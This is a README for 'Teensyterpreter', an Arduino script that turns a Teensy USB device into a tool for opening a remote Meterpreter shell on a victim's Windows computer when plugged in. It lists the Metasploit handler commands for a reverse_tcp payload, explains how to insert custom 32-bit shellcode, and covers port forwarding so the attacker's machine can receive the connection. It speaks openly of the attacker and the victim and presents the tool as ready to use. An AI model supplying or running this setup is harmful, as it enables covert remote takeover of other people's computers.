Teensyterpreter
===============

A small Arduino script used to open a remote Meterpreter shell on a victim's computer. Designed to be loaded onto a Teensy 2.0 or later and then plugged in to the target. The attacker must use a Metasploit shell to connect back to the target, if using the supplied shellcode, though custom shellcode can be used. 

Supplied Shellcode & Metasploit Setup
------------------

The normal shell can be received by the attackers computer listening for a connection. Port forwarding is required, and your IP and port must be entered into the first two lines of the script. The Teensy will automatically convert your IP and port into hexadecimal, and will automatically insert it into the code where it needs to be. The shell can be received using the following metasploit commands, in order. You must replace the port and IP with your public IP and the public port you are using.

```
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 192.168.1.1
set LPORT 4444
set ExitOnSession false
exploit -j -z
```
Custom Shellcode
----------------

In the case that you are supplying your own custom shellcode, it must be in the correct format for proper use. See the normal shellcode for an example. The shellcode must also be generated for a 32 bit Windows x86 architecture, and placed with the exact punctuation and spacing as the default shellcode into the custom shellcode variable. 

Port-Forwarding
---------------

If you are behind a router or other internet access device, you will probably need to port-forward your computer. Consult your router's manual for a tutorial on how to do this, or read one of the many guides online. 

Fun Stuff
--------- 

Metasploit has a joke payload, the "You Got Pwned" payload. I'd also reccomend consulting the USB Rubber Ducky forums for ideas and ways to perform jokes and pranks using an HID USB.
